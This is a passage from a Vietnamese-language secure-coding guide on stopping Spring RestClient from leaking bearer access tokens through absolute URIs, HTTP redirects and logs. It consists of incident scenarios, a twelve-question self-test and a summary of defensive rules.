**Xử lý:** không tự gửi lại body và token sang host đó. Nếu retry là cần thiết, xác định method, target và idempotency.

### Tình huống D: absolute URI ghi đè baseUrl

Một developer gọi `ordersClient.get().uri(userUrl)`.

**Xử lý:** guard kiểm tra URI cuối và từ chối host khác.

### Tình huống E: token trong logs

Interceptor ghi toàn bộ headers.

**Xử lý:** bật redaction, xử lý bản ghi đã lộ và đánh giá token revocation khi cần.

### Tình huống F: API đổi domain

Orders API chuyển sang host mới, trả 301.

**Xử lý:** xác minh host, TLS, audience và cập nhật cấu hình có kiểm soát thay vì follow tự động với token cũ.

## 22. Câu hỏi tự kiểm tra

**1. Vì sao `RestClient.baseUrl(...)` không đủ để chống lộ access token?**

Vì một URI tuyệt đối/custom resolver có thể đổi host cuối; cần kiểm tra URI thực tế trước request.

**2. Host policy tối thiểu kiểm tra gì?**

HTTPS, hostname chính xác, port, userinfo/cấu trúc URI; khi cần thêm path/method và egress.

**3. Có dùng `url.contains("orders-api.example.com")` được không?**

Không. Chuỗi có thể nằm trong userinfo hoặc hostname giả. Parse URI và kiểm tra `getHost()`.

**4. Vì sao 302 có thể làm lộ token?**

Client hoặc interceptor có thể giữ/gắn lại Authorization vào request follow-up tới host khác.

**5. Có thể khẳng định mọi HTTP client đều forward Authorization cross-origin không?**

Không. Behavior khác nhau theo implementation và cấu hình.

**6. Vì sao disable auto redirect là hữu ích?**

Nó ngăn HTTP client tự thực hiện request thứ hai đến target chưa được ứng dụng kiểm tra.

**7. Điều đặc biệt của 307/308 là gì?**

Chúng giữ method/body khi follow, nên POST data và bearer token có thể bị gửi lại.

**8. Hostname đúng có bảo đảm IP kết nối an toàn không?**

Không. Còn DNS rebinding, proxy và egress policy.

**9. Có thể dùng ID token thay access token khi API trả 401 không?**

Không. ID token thuộc xác thực OIDC tại RP, không phải access token API.

**10. API đổi domain có nên tự follow redirect với token cũ?**

Không. Cần đánh giá host mới, TLS, audience/scope và cấu hình.

**11. API trả 403 có nghĩa refresh token sẽ sửa lỗi?**

Không. Có thể thiếu scope/quyền nghiệp vụ; refresh không mặc định tăng quyền.

**12. Sau nghi vấn token leak, xóa authorized client là đủ chưa?**

Chưa. Cần đánh giá khả năng token vẫn hợp lệ tại AS/RS và xử lý revocation theo policy.

## Ghi nhớ

- **Bearer access token chỉ được gửi tới Resource Server và host đã duyệt.** Registration ID không phải host allowlist; audience validation của API không thay thế outbound policy.
- **`RestClient.baseUrl(...)` không phải security boundary.** Dùng route cố định và kiểm tra URI cuối cùng.
- **HTTP redirect có thể đổi origin nhận credential**. Hành vi forwarding Authorization tùy HTTP client; không auto follow redirect thường là giải pháp an toàn, dễ kiểm soát cho REST client mang token.
- **Kiểm tra HTTPS, hostname chính xác, port và cấu trúc URI**, kết hợp egress/DNS/proxy controls để giảm SSRF.
- **Tách client theo API, chọn access token đúng audience/scope**, không tự gắn token vào URL do browser quyết định.
- **Không đưa token vào query, logs, tracing hoặc exception**, không tắt TLS certificate verification.
- **Xử lý 3xx, 401, 403 đúng tầng**, tránh retry request nghiệp vụ có side effect mà không có idempotency.
- **Sau nghi vấn token bị lộ**, phải đánh giá và xử lý credential thực tế, không chỉ xóa bản ghi local.
